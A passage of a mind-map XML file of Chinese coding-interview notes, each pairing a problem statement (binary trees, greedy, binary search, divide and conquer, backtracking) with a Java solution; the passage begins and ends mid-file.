  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/a861533d45854474ac791d90e447bafd?tpId=13&amp;tqId=11176&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一个整数数组，判断该数组是不是某二叉搜索树的后序遍历的结果。假设输入的数组的任意两个数字都互不相同。
      </p>
      <p>
        例如，下图是后序遍历序列 1,3,2 所对应的二叉搜索树。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/13454fa1-23a8-4578-9663-2b13a6af564a.jpg" width="150"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public boolean VerifySquenceOfBST(int[] sequence) {
    if (sequence == null || sequence.length == 0)
        return false;
    return verify(sequence, 0, sequence.length - 1);
}
private boolean verify(int[] sequence, int first, int last) {
    if (last - first &lt;= 1)
        return true;
    int rootVal = sequence[last];
    int cutIndex = first;
    while (cutIndex &lt; last &amp;&amp; sequence[cutIndex] &lt;= rootVal)
        cutIndex++;
    for (int i = cutIndex; i &lt; last; i++)
        if (sequence[i] &lt; rootVal)
            return false;
    return verify(sequence, first, cutIndex - 1) &amp;&amp; verify(sequence, cutIndex, last - 1);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_512700870" CREATED="1754750414136" MODIFIED="1754751213980" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/34.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E5%92%8C%E4%B8%BA%E6%9F%90%E4%B8%80%E5%80%BC%E7%9A%84%E8%B7%AF%E5%BE%84.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    34. 二叉树中和为某一值的路径
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/b736e784e3e34731af99065031301bca?tpId=13&amp;tqId=11177&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一颗二叉树和一个整数，打印出二叉树中结点值的和为输入整数的所有路径。路径定义为从树的根结点开始往下一直到叶结点所经过的结点形成一条路径。
      </p>
      <p>
        下图的二叉树有两条和为 22 的路径：10, 5, 7 和 10, 12
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ed77b0e6-38d9-4a34-844f-724f3ffa2c12.jpg" width="200"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>private ArrayList&lt;ArrayList&lt;Integer&gt;&gt; ret = new ArrayList&lt;&gt;();
public ArrayList&lt;ArrayList&lt;Integer&gt;&gt; FindPath(TreeNode root, int target) {
    backtracking(root, target, new ArrayList&lt;&gt;());
    return ret;
}
private void backtracking(TreeNode node, int target, ArrayList&lt;Integer&gt; path) {
    if (node == null)
        return;
    path.add(node.val);
    target -= node.val;
    if (target == 0 &amp;&amp; node.left == null &amp;&amp; node.right == null) {
        ret.add(new ArrayList&lt;&gt;(path));
    } else {
        backtracking(node.left, target, path);
        backtracking(node.right, target, path);
    }
    path.remove(path.size() - 1);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_514052959" CREATED="1754750414139" MODIFIED="1754751214636" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/36.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%8E%E5%8F%8C%E5%90%91%E9%93%BE%E8%A1%A8.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    36. 二叉搜索树与双向链表
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/947f6eb80d944a84850b0538bf0ec3a5?tpId=13&amp;tqId=11179&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        输入一棵二叉搜索树，将该二叉搜索树转换成一个排序的双向链表。要求不能创建任何新的结点，只能调整树中结点指针的指向。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/05a08f2e-9914-4a77-92ef-aebeaecf4f66.jpg" width="400"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>private TreeNode pre = null;
private TreeNode head = null;
public TreeNode Convert(TreeNode root) {
    inOrder(root);
    return head;
}
private void inOrder(TreeNode node) {
    if (node == null)
        return;
    inOrder(node.left);
    node.left = pre;
    if (pre != null)
        pre.right = node;
    pre = node;
    if (head == null)
        head = node;
    inOrder(node.right);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_580778613" CREATED="1754750414142" MODIFIED="1754751214052" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/37.%20%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    37. 序列化二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/cf7e25aa97c04cc1a68c8f040e71fb84?tpId=13&amp;tqId=11214&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        请实现两个函数，分别用来序列化和反序列化二叉树。
      </p>
      <h2>
        解题思路
      </h2>
      <pre>private String deserializeStr;
public String Serialize(TreeNode root) {
    if (root == null)
        return &quot;#&quot;;
    return root.val + &quot; &quot; + Serialize(root.left) + &quot; &quot; + Serialize(root.right);
}
public TreeNode Deserialize(String str) {
    deserializeStr = str;
    return Deserialize();
}
private TreeNode Deserialize() {
    if (deserializeStr.length() == 0)
        return null;
    int index = deserializeStr.indexOf(&quot; &quot;);
    String node = index == -1 ? deserializeStr : deserializeStr.substring(0, index);
    deserializeStr = index == -1 ? &quot;&quot; : deserializeStr.substring(index + 1);
    if (node.equals(&quot;#&quot;))
        return null;
    int val = Integer.valueOf(node);
    TreeNode t = new TreeNode(val);
    t.left = Deserialize();
    t.right = Deserialize();
    return t;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1515485421" CREATED="1754750414145" MODIFIED="1754751214038" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/54.%20%E4%BA%8C%E5%8F%89%E6%9F%A5%E6%89%BE%E6%A0%91%E7%9A%84%E7%AC%AC%20K%20%E4%B8%AA%E7%BB%93%E7%82%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    54. 二叉查找树的第 K 个结点
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/ef068f602dde4d28aab2b210e859150a?tpId=13&amp;tqId=11215&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        利用二叉查找树中序遍历有序的特点。
      </p>
      <pre>private TreeNode ret;
private int cnt = 0;
public TreeNode KthNode(TreeNode pRoot, int k) {
    inOrder(pRoot, k);
    return ret;
}
private void inOrder(TreeNode root, int k) {
    if (root == null || cnt &gt;= k)
        return;
    inOrder(root.left, k);
    cnt++;
    if (cnt == k)
        ret = root;
    inOrder(root.right, k);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1888428873" CREATED="1754750414148" MODIFIED="1754751214523" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/55.1%20%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%B7%B1%E5%BA%A6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    55.1 二叉树的深度
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/435fb86331474282a3499955f0a41e8b?tpId=13&amp;tqId=11191&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        从根结点到叶结点依次经过的结点（含根、叶结点）形成树的一条路径，最长路径的长度为树的深度。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/ba355101-4a93-4c71-94fb-1da83639727b.jpg" width="350px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>public int TreeDepth(TreeNode root) {
    return root == null ? 0 : 1 + Math.max(TreeDepth(root.left), TreeDepth(root.right));
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_915974218" CREATED="1754750414150" MODIFIED="1754751214524" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/55.2%20%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    55.2 平衡二叉树
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/8b3b95850edb4115918ecebdf1b4d222?tpId=13&amp;tqId=11192&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">NowCoder</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        平衡二叉树左右子树高度差不超过 1。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/af1d1166-63af-47b6-9aa3-2bf2bd37bd03.jpg" width="250px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <pre>private boolean isBalanced = true;
public boolean IsBalanced_Solution(TreeNode root) {
    height(root);
    return isBalanced;
}
private int height(TreeNode root) {
    if (root == null || !isBalanced)
        return 0;
    int left = height(root.left);
    int right = height(root.right);
    if (Math.abs(left - right) &gt; 1)
        isBalanced = false;
    return 1 + Math.max(left, right);
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_548484078" CREATED="1754750414154" MODIFIED="1754751214524" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/68.%20%E6%A0%91%E4%B8%AD%E4%B8%A4%E4%B8%AA%E8%8A%82%E7%82%B9%E7%9A%84%E6%9C%80%E4%BD%8E%E5%85%AC%E5%85%B1%E7%A5%96%E5%85%88.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    68. 树中两个节点的最低公共祖先
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        68.1 二叉查找树
      </h2>
      <h3>
        题目链接
      </h3>
      <p>
        <a href="https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-search-tree/description/">Leetcode : 235. Lowest Common Ancestor of a Binary Search Tree</a>
      </p>
      <h3>
        解题思路
      </h3>
      <p>
        在二叉查找树中，两个节点 p, q 的公共祖先 root 满足 root.val &gt;= p.val &amp;&amp; root.val \&lt;= q.val。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/047faac4-a368-4565-8331-2b66253080d3.jpg" width="250"/>
        
      </div>
      <br/>
      

      <pre>public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {
    if (root == null)
        return root;
    if (root.val &gt; p.val &amp;&amp; root.val &gt; q.val)
        return lowestCommonAncestor(root.left, p, q);
    if (root.val &lt; p.val &amp;&amp; root.val &lt; q.val)
        return lowestCommonAncestor(root.right, p, q);
    return root;
}</pre>
      <h2>
        68.2 普通二叉树
      </h2>
      <h3>
        题目链接
      </h3>
      <p>
        <a href="https://leetcode.com/problems/lowest-common-ancestor-of-a-binary-tree/description/">Leetcode : 236. Lowest Common Ancestor of a Binary Tree</a>
      </p>
      <h3>
        解题思路
      </h3>
      <p>
        在左右子树中查找是否存在 p 或者 q，如果 p 和 q 分别在两个子树中，那么就说明根节点就是最低公共祖先。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/d27c99f0-7881-4f2d-9675-c75cbdee3acd.jpg" width="250"/>
        
      </div>
      <br/>
      

      <pre>public TreeNode lowestCommonAncestor(TreeNode root, TreeNode p, TreeNode q) {
    if (root == null || root == p || root == q)
        return root;
    TreeNode left = lowestCommonAncestor(root.left, p, q);
    TreeNode right = lowestCommonAncestor(root.right, p, q);
    return left == null ? right : right == null ? left : root;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_687239431" CREATED="1754750400549" MODIFIED="1754750414165" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      贪心思想
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_572545179" CREATED="1754750414159" MODIFIED="1754751219736" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/14.%20%E5%89%AA%E7%BB%B3%E5%AD%90.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    14. 剪绳子
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/57d85990ba5b440ab888fc72b0751bf8?tpId=13&amp;tqId=33257&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        把一根绳子剪成多段，并且使得每段的长度乘积最大。
      </p>
      <pre>n = 2
return 1 (2 = 1 + 1)
n = 10
return 36 (10 = 3 + 3 + 4)</pre>
      <h2>
        解题思路
      </h2>
      <h3>
        贪心
      </h3>
      <p>
        尽可能得多剪长度为 3 的绳子，并且不允许有长度为 1 的绳子出现。如果出现了，就从已经切好长度为 3 的绳子中拿出一段与长度为 1 的绳子重新组合，把它们切成两段长度为 2 的绳子。以下为证明过程。
      </p>
      <p>
        将绳子拆成 1 和 n-1，则 1(n-1)-n=-1\&lt;0，即拆开后的乘积一定更小，所以不能出现长度为 1 的绳子。
      </p>
      <p>
        将绳子拆成 2 和 n-2，则 2(n-2)-n = n-4，在 n&gt;=4 时这样拆开能得到的乘积会比不拆更大。
      </p>
      <p>
        将绳子拆成 3 和 n-3，则 3(n-3)-n = 2n-9，在 n&gt;=5 时效果更好。
      </p>
      <p>
        将绳子拆成 4 和 n-4，因为 4=2*2，因此效果和拆成 2 一样。
      </p>
      <p>
        将绳子拆成 5 和 n-5，因为 5=2+3，而 5\&lt;2*3，所以不能出现 5 的绳子，而是尽可能拆成 2 和 3。
      </p>
      <p>
        将绳子拆成 6 和 n-6，因为 6=3+3，而 6\&lt;3\*3，所以不能出现 6 的绳子，而是拆成 3 和 3。这里 6 同样可以拆成 6=2+2+2，但是 3(n - 3) - 2(n - 2) = n - 5 \&gt;= 0，在 n&gt;=5 的情况下将绳子拆成 3 比拆成 2 效果更好。
      </p>
      <p>
        继续拆成更大的绳子可以发现都比拆成 2 和 3 的效果更差，因此我们只考虑将绳子拆成 2 和 3，并且优先拆成 3，当拆到绳子长度 n 等于 4 时，也就是出现 3+1，此时只能拆成 2+2。
      </p>
      <pre>public int cutRope(int n) {
    if (n &lt; 2)
        return 0;
    if (n == 2)
        return 1;
    if (n == 3)
        return 2;
    int timesOf3 = n / 3;
    if (n - timesOf3 * 3 == 1)
        timesOf3--;
    int timesOf2 = (n - timesOf3 * 3) / 2;
    return (int) (Math.pow(3, timesOf3)) * (int) (Math.pow(2, timesOf2));
}</pre>
      <h3>
        动态规划
      </h3>
      <pre>public int cutRope(int n) {
    int[] dp = new int[n + 1];
    dp[1] = 1;
    for (int i = 2; i &lt;= n; i++)
        for (int j = 1; j &lt; i; j++)
            dp[i] = Math.max(dp[i], Math.max(j * (i - j), dp[j] * (i - j)));
    return dp[n];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_1430419640" CREATED="1754750414163" MODIFIED="1754751219816" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/63.%20%E8%82%A1%E7%A5%A8%E7%9A%84%E6%9C%80%E5%A4%A7%E5%88%A9%E6%B6%A6.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    63. 股票的最大利润
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://leetcode.com/problems/best-time-to-buy-and-sell-stock/description/">Leetcode：121. Best Time to Buy and Sell Stock</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        可以有一次买入和一次卖出，买入必须在前。求最大收益。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/42661013-750f-420b-b3c1-437e9a11fb65.png" width="220px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        使用贪心策略，假设第 i 轮进行卖出操作，买入操作价格应该在 i 之前并且价格最低。因此在遍历数组时记录当前最低的买入价格，并且尝试将每个位置都作为卖出价格，取收益最大的即可。
      </p>
      <pre>public int maxProfit(int[] prices) {
    if (prices == null || prices.length == 0)
        return 0;
    int soFarMin = prices[0];
    int maxProfit = 0;
    for (int i = 1; i &lt; prices.length; i++) {
        soFarMin = Math.min(soFarMin, prices[i]);
        maxProfit = Math.max(maxProfit, prices[i] - soFarMin);
    }
    return maxProfit;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_643346151" CREATED="1754750400553" MODIFIED="1754750414172" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      二分查找
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1805114558" CREATED="1754750414166" MODIFIED="1754751220137" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/11.%20%E6%97%8B%E8%BD%AC%E6%95%B0%E7%BB%84%E7%9A%84%E6%9C%80%E5%B0%8F%E6%95%B0%E5%AD%97.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    11. 旋转数组的最小数字
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/9f3231a991af4f55b95579b44b7a01ba?tpId=13&amp;tqId=11159&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        把一个数组最开始的若干个元素搬到数组的末尾，我们称之为数组的旋转。输入一个非递减排序的数组的一个旋转，输出旋转数组的最小元素。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/0038204c-4b8a-42a5-921d-080f6674f989.png" width="210px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        将旋转数组对半分可以得到一个包含最小元素的新旋转数组，以及一个非递减排序的数组。新的旋转数组的长度是原数组的一半，从而将问题规模减少了一半，这种折半性质的算法的时间复杂度为 O(log<sub>2</sub>N)。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/424f34ab-a9fd-49a6-9969-d76b42251365.png" width="300px"/>
        
      </div>
      <br/>
      

      <p>
        此时问题的关键在于确定对半分得到的两个数组哪一个是旋转数组，哪一个是非递减数组。我们很容易知道非递减数组的第一个元素一定小于等于最后一个元素。
      </p>
      <p>
        通过修改二分查找算法进行求解（l 代表 low，m 代表 mid，h 代表 high）：
      </p>
      <ul>
        <li>
          当 nums[m] \&lt;= nums[h] 时，表示 [m, h] 区间内的数组是非递减数组，[l, m] 区间内的数组是旋转数组，此时令 h = m；
        </li>
        <li>
          否则 [m + 1, h] 区间内的数组是旋转数组，令 l = m + 1。
        </li>
      </ul>
      <pre>public int minNumberInRotateArray(int[] nums) {
    if (nums.length == 0)
        return 0;
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[m] &lt;= nums[h])
            h = m;
        else
            l = m + 1;
    }
    return nums[l];
}</pre>
      <p>
        如果数组元素允许重复，会出现一个特殊的情况：nums[l] == nums[m] == nums[h]，此时无法确定解在哪个区间，需要切换到顺序查找。例如对于数组 {1,1,1,0,1}，l、m 和 h 指向的数都为 1，此时无法知道最小数字 0 在哪个区间。
      </p>
      <pre>public int minNumberInRotateArray(int[] nums) {
    if (nums.length == 0)
        return 0;
    int l = 0, h = nums.length - 1;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[l] == nums[m] &amp;&amp; nums[m] == nums[h])
            return minNumber(nums, l, h);
        else if (nums[m] &lt;= nums[h])
            h = m;
        else
            l = m + 1;
    }
    return nums[l];
}
private int minNumber(int[] nums, int l, int h) {
    for (int i = l; i &lt; h; i++)
        if (nums[i] &gt; nums[i + 1])
            return nums[i + 1];
    return nums[l];
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
<node ID="ID_93600479" CREATED="1754750414169" MODIFIED="1754751219591" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/53.%20%E6%95%B0%E5%AD%97%E5%9C%A8%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9A%84%E6%AC%A1%E6%95%B0.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    53. 数字在排序数组中出现的次数
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/70610bf967994b22bb1c26f9ae901fa2?tpId=13&amp;tqId=11190&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <pre>Input:
nums = 1, 2, 3, 3, 3, 3, 4, 6
K = 3
Output:
4</pre>
      <h2>
        解题思路
      </h2>
      <p>
        只要能找出给定的数字 k 在有序数组第一个位置和最后一个位置，就能知道该数字出现的次数。
      </p>
      <p>
        先考虑如何实现寻找数字在有序数组的第一个位置。正常的二分查找如下，在查找到给定元素 k 之后，立即返回当前索引下标。
      </p>
      <pre>public int binarySearch(int[] nums, int K) {
    int l = 0, h = nums.length - 1;
    while (l &lt;= h) {
        int m = l + (h - l) / 2;
        if (nums[m] == K) {
            return m;
        } else if (nums[m] &gt; K) {
            h = m - 1;
        } else {
            l = m + 1;
        }
    }
    return -1;
}</pre>
      <p>
        但是在查找第一个位置时，找到元素之后应该继续往前找。也就是当 nums[m]&gt;=k 时，在左区间继续查找，左区间应该包含 m 位置。
      </p>
      <pre>private int binarySearch(int[] nums, int K) {
    int l = 0, h = nums.length;
    while (l &lt; h) {
        int m = l + (h - l) / 2;
        if (nums[m] &gt;= K)
            h = m;
        else
            l = m + 1;
    }
    return l;
}</pre>
      <p>
        查找最后一个位置可以转换成寻找 k+1 的第一个位置，并再往前移动一个位置。
      </p>
      <pre>public int GetNumberOfK(int[] nums, int K) {
    int first = binarySearch(nums, K);
    int last = binarySearch(nums, K + 1);
    return (first == nums.length || nums[first] != K) ? 0 : last - first;
}</pre>
      <p>
        需要注意以上实现的查找第一个位置的 binarySearch 方法，h 的初始值为 nums.length，而不是 nums.length - 1。先看以下示例：
      </p>
      <pre>nums = [2,2], k = 2</pre>
      <p>
        如果 h 的取值为 nums.length - 1，那么在查找最后一个位置时，binarySearch(nums, k + 1) - 1 = 1 - 1 = 0。这是因为 binarySearch 只会返回 [0, nums.length - 1] 范围的值，对于 binarySearch([2,2], 3) ，我们希望返回 3 插入 nums 中的位置，也就是数组最后一个位置再往后一个位置，即 nums.length。所以我们需要将 h 取值为 nums.length，从而使得 binarySearch 返回的区间更大，能够覆盖 k 大于 nums 最后一个元素的情况。
      </p>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1618492138" CREATED="1754750400559" MODIFIED="1754750414175" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      分治
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_699421099" CREATED="1754750414173" MODIFIED="1754751220431" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/16.%20%E6%95%B0%E5%80%BC%E7%9A%84%E6%95%B4%E6%95%B0%E6%AC%A1%E6%96%B9.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    16. 数值的整数次方
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <h2>
        题目链接
      </h2>
      <p>
        <a href="https://www.nowcoder.com/practice/1a834e5e3e1a4b7ba251417554e07c00?tpId=13&amp;tqId=11165&amp;tPage=1&amp;rp=1&amp;ru=/ta/coding-interviews&amp;qru=/ta/coding-interviews/question-ranking&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        给定一个 double 类型的浮点数 x和 int 类型的整数 n，求 x 的 n 次方。
      </p>
      <h2>
        解题思路
      </h2>
      <p>
        最直观的解法是将 x 重复乘 n 次，x*x*x...*x，那么时间复杂度为 O(N)。因为乘法是可交换的，所以可以将上述操作拆开成两半 (x*x..*x)* (x*x..*x)，两半的计算是一样的，因此只需要计算一次。而且对于新拆开的计算，又可以继续拆开。这就是分治思想，将原问题的规模拆成多个规模较小的子问题，最后子问题的解合并起来。
      </p>
      <p>
        本题中子问题是 x<sup>n/2</sup>，在将子问题合并时将子问题的解乘于自身相乘即可。但如果 n 不为偶数，那么拆成两半还会剩下一个 x，在将子问题合并时还需要需要多乘于一个 x。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/image-20201105012506187.png" width="400px"/>
        
      </div>
      <br/>
      

      <p>
        因为 (x*x)<sup>n/2</sup>&#xa0;可以通过递归求解，并且每次递归 n 都减小一半，因此整个算法的时间复杂度为 O(logN)。
      </p>
      <pre>public double Power(double x, int n) {
    boolean isNegative = false;
    if (n &lt; 0) {
        n = -n;
        isNegative = true;
    }
    double res = pow(x, n);
    return isNegative ? 1 / res : res;
}
private double pow(double x, int n) {
    if (n == 0) return 1;
    if (n == 1) return x;
    double res = pow(x, n / 2);
    res = res * res;
    if (n % 2 != 0) res *= x;
    return res;
}</pre>
    </div>
  </body>
</html></richcontent>
</node>
</node>
<node FOLDED="true" ID="ID_1733387635" CREATED="1754750400563" MODIFIED="1754750414184" MAX_WIDTH="800 px"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    <p>
      搜索
    </p>
  </body>
</html>
</richcontent>
<node ID="ID_1415391014" CREATED="1754750414176" MODIFIED="1754751220149" LINK="https://github.com/CyC2018/CS-Notes/blob/master/notes/12.%20%E7%9F%A9%E9%98%B5%E4%B8%AD%E7%9A%84%E8%B7%AF%E5%BE%84.md"><richcontent TYPE="NODE">

<html>
  <head>
    
  </head>
  <body>
    12. 矩阵中的路径
  </body>
</html>
</richcontent>
<richcontent TYPE="NOTE">
<html>
  <head>
    
  </head>
  <body>
    <div class="container">
      <p>
        <a href="https://www.nowcoder.com/practice/69fe7a584f0a445da1b6652978de5c38?tpId=13&amp;tqId=11218&amp;tab=answerKey&amp;from=cyc_github">牛客网</a>
      </p>
      <h2>
        题目描述
      </h2>
      <p>
        判断在一个矩阵中是否存在一条包含某字符串所有字符的路径。路径可以从矩阵中的任意一个格子开始，每一步可以在矩阵中向上下左右移动一个格子。如果一条路径经过了矩阵中的某一个格子，则该路径不能再进入该格子。
      </p>
      <p>
        例如下面的矩阵包含了一条 bfce 路径。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/1db1c7ea-0443-478b-8df9-7e33b1336cc4.png" width="200px"/>
        
      </div>
      <br/>
      

      <h2>
        解题思路
      </h2>
      <p>
        使用回溯法（backtracking）进行求解，它是一种暴力搜索方法，通过搜索所有可能的结果来求解问题。回溯法在一次搜索结束时需要进行回溯（回退），将这一次搜索过程中设置的状态进行清除，从而开始一次新的搜索过程。例如下图示例中，从 f 开始，下一步有 4 种搜索可能，如果先搜索 b，需要将 b 标记为已经使用，防止重复使用。在这一次搜索结束之后，需要将 b 的已经使用状态清除，并搜索 c。
      </p>
      <div>
        <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/dc964b86-7a08-4bde-a3d9-e6ddceb29f98.png" width="200px"/>
        
      </div>
      <br/>
      

      <p>
        本题的输入是数组而不是矩阵（二维数组），因此需要先将数组转换成矩阵。
      </p>
      <pre>public class Solution {
